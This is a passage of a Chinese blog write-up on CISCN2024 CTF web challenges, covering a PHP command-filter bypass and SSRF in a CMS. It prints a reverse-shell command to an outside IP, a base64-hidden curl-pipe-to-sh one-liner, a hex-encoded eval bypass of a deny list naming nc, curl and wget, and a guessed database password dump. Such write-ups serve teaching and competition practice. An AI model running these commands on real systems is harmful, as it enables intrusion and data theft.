
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>CISCN2024 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-php"><span class="toc-number">2.1.</span> <span class="toc-text">Simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">2.2.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">sanic（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87cookie%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">sanic解析绕过cookie检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">pydash原型链污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93-file"><span class="toc-number">2.3.3.</span> <span class="toc-text">污染__file__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B1%A1%E6%9F%93%E9%93%BE"><span class="toc-number">2.3.4.</span> <span class="toc-text">寻找污染链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93directory-view"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">污染directory_view</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93directory"><span class="toc-number">2.3.4.2.</span> <span class="toc-text">污染directory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">2.3.4.3.</span> <span class="toc-text">最终payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.5.</span> <span class="toc-text">其它文件读取的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.6.</span> <span class="toc-text">内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">2.4.</span> <span class="toc-text">easycms_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">解法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.4.2.</span> <span class="toc-text">解法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-number">2.4.3.</span> <span class="toc-text">解法三：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfern-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">mossfern (复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava-Unsolved"><span class="toc-number">2.6.</span> <span class="toc-text">ezjava (Unsolved)</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>CISCN2024</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/18
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Java/" style="color: #00bcd4">Java</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #ff7d73">沙箱逃逸</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/CMS/" style="color: #00bcd4">CMS</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/python/" style="color: #ffa2c4">python</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">6.1k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">29分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>唉唉，某种意义上web爆0了，<del>“你们怎么不做web啊，是不想做吗”</del></p>
<p>simple_php是队友点出来的，cms是头天晚上突然审明白才会的</p>
<p>两道python是有大概思路但是不会做的</p>
<p>jdbc是没学的。。。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/139047540">https://blog.csdn.net/Jayjay___/article/details/139047540</a></p>
<p><a target="_blank" rel="noopener" href="https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/">https://jbnrz.com.cn/index.php/2024/05/20/ciscn-2024/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p><a target="_blank" rel="noopener" href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/">https://www.jackacc.com/uncategorized/ciscn-2024-web-writeups/</a></p>
<p><a target="_blank" rel="noopener" href="http://124.221.19.214/archives/681/#cl-3">http://124.221.19.214/archives/681/#cl-3</a></p>
<span id="more"></span>

<hr>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试一下，发现这些字符不会被<code>escapeshellcmd</code>转义：<code>@</code>，<code>+</code>，<code>-</code>，<code>=</code>，<code>:</code>，<code>,</code>，<code>.</code>，<code>/</code></p>
<p>整理一下我们可以用的命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span>
<span class="token function">tee</span>
base32
<span class="token builtin class-name">pwd</span>
<span class="token builtin class-name">set</span>
<span class="token builtin class-name">printf</span>
php
mysql
<span class="token function">paste</span>	<span class="token comment"># 这个可以直接读文件</span>
<span class="token function">rev</span>	<span class="token comment"># 这个可以直接读文件</span>
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤太多了，我们考虑自己用<code>php -r</code>执行一个新的php脚本，用eval，这样就可以套<code>hex2bin</code>这种php自带的字符转换函数</p>
<p>因为ban了引号，这里得利用强转字符串的特性来获得字符串，用<code>substr</code>截取</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span>_6563686f20606c73202f603b<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后发现flag不在根目录也不在环境变量里面，猜测在数据库里面（用<code>paste /etc/passwd</code>可以发现存在mysql用户）</p>
<p>弹个shell</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/115.236.153.172/13314 &lt;&amp;1'</span><span class="token variable">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span>_6563686f206062617368202d63202762617368202d69203e26202f6465762f7463702f3131352e3233362e3135332e3137322f3133333134203c263127603b<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后突然想起来webshell没有上下文，只能直接输mysql参数带命令（</p>
<p>猜root密码为root</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root -p<span class="token string">'root'</span> <span class="token parameter variable">-e</span> <span class="token string">'show databases;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240518123150346.png" alt="image-20240518123150346"></p>
<p>flag在PHP_CMS下的F1ag_Se3Re7</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span>mysql <span class="token parameter variable">-u</span> root -p<span class="token string">'root'</span> <span class="token parameter variable">-e</span> <span class="token string">'show databases;use PHP_CMS;show tables;select * from F1ag_Se3Re7;'</span><span class="token variable">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240518123330792.png" alt="image-20240518123330792"></p>
<p>Boogipop的解法：反斜杠+base64编码秒了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span><span class="token keyword">eval</span> <span class="token string backtick-quoted-string">`ec\ho Y3VybCBo\dHRwOi8vOC4xMzAuMjQuMTg4OjgwMDAvMS5zaHxzaA==|base\64 -d|s\h`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p><del>感觉比上一题简单，当天晚上审了十分钟就出了</del>，但是白天就没想到。。</p>
<p>flag.php</p>
<p>返回<code>Just input &#39;cmd&#39; From 127.0.0.1</code></p>
<p>hint给了源码，还让我们上github看框架的源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just input 'cmd' From 127.0.0.1"</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
   <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>明显是要ssrf了</p>
<p>又扫出来个Readme.txt</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">迅睿CMS官方下载地址：https://www.xunruicms.com/down/


#### 安装路径
将网站运行目录（主目录）设置为：public（如果没有就忽略设置）
安装环境监测：/test.php
程序安装地址：/install.php
后台登录地址：/admin****.php（****是随机的）
重置后台地址：https://www.xunruicms.com/doc/1097.html
首次使用方法：https://www.xunruicms.com/doc/631.html

#### 运行环境

Laravel内核：PHP8.0及以上
ThinkPHP内核：PHP7.4及以上
CodeIgniter内核：PHP7.4及以上
CodeIgniter72内核：PHP7.2及以上

MySQL数据库：MySQL5及以上，推荐5.7及以上


#### 内核切换方法
https://www.xunruicms.com/doc/1246.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>后台地址随机4位字符，这玩意爆到靶机关掉都爆不出来，所以不求进后台了</p>
<p>先去github把源码下下来：<a target="_blank" rel="noopener" href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
<p>然后边看官方文档边审：<a target="_blank" rel="noopener" href="https://www.xunruicms.com/doc/203.html">https://www.xunruicms.com/doc/203.html</a></p>
<p>发现有一个<strong>调用远程数据</strong>的内置函数</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240518213358486.png" alt="image-20240518213358486"></p>
<p>本地找到对应方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 调用远程数据
 *
 * @param   string  $url
 * @param   intval  $timeout 超时时间，0不超时
 * @return  string
 */</span>
<span class="token keyword">function</span> <span class="token function-definition function">dr_catcher_data</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// 获取本地文件</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file://'</span><span class="token punctuation">)</span>  <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// curl模式</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl_init'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"https://"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 跳过证书检查</span>
            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从证书中检查SSL加密算法是否存在</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 最大执行时间</span>
        <span class="token variable">$timeout</span> <span class="token operator">&amp;&amp;</span> <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$errno</span> <span class="token operator">=</span> <span class="token function">curl_errno</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">CI_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">log_message</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'获取远程数据失败['</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">']：（'</span><span class="token operator">.</span><span class="token variable">$errno</span><span class="token operator">.</span><span class="token string single-quoted-string">'）'</span><span class="token operator">.</span><span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$errno</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 当服务器不支持时改为普通获取方式</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//设置超时参数</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stream_context_create'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 解析协议</span>
        <span class="token variable">$opt</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
